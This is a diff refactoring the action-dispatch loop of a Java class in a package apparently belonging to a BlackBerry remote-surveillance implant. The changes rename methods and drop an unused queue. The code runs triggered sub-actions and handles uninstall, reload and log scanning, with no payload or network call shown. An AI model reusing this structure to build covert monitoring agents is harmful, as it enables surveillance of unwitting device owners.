@@ -15,7 +15,6 @@ import com.ht.rcs.blackberry.action.SubAction;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Queue;
 import com.ht.rcs.blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -45,15 +44,11 @@ public class Task {
     /** The agent manager. */
     AgentManager agentManager = null;
 
-    /** The queue. */
-    Queue queue = null;
 
     /**
      * Instantiates a new task.
      */
-    public Task() {
-        queue = new Queue();
-
+    public Task() {     
         // Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le
         // code
         status = Status.getInstance();
@@ -70,10 +65,10 @@ public class Task {
      * @return true, if successful
      */
     public synchronized boolean checkActions() {
-        Utils.Sleep(1000);
+        Utils.sleep(1000);
 
         for (;;) {
-            Vector actions = this.status.GetActionsList();
+            Vector actions = this.status.getActionsList();
 
             for (int i = 0; i < actions.size(); i++) {
                 Action action = (Action) actions.elementAt(i);
@@ -84,32 +79,32 @@ public class Task {
 
                 debug.trace("CheckActions() triggered" + action);
 
-                action.SetTriggered(false);
+                action.setTriggered(false);
 
-                Vector subActions = action.GetSubActionsList();
+                Vector subActions = action.getSubActionsList();
 
                 for (int j = 0; j < subActions.size(); j++) {
 
                     SubAction subAction = (SubAction) subActions.elementAt(j);
-                    boolean ret = subAction.Execute();
+                    boolean ret = subAction.execute();
 
                     if (ret == false) {
                         break;
                     }
 
-                    if (subAction.WantUninstall()) {
+                    if (subAction.wantUninstall()) {
                         debug.warn("CheckActions() uninstalling");
                         return false;
                     }
 
-                    if (subAction.WantReload()) {
+                    if (subAction.wantReload()) {
                         debug.warn("CheckActions() reloading");
                         return true;
                     }
                 }
             }
 
-            Utils.Sleep(600);
+            Utils.sleep(600);
         }
 
     }
@@ -140,7 +135,7 @@ public class Task {
         Msg.demo("Configuration... OK\n");
 
         if (logCollector != null) {
-            logCollector.ScanLogs();
+            logCollector.scanLogs();
         }
 
         // Da qui in poi inizia la concorrenza dei thread
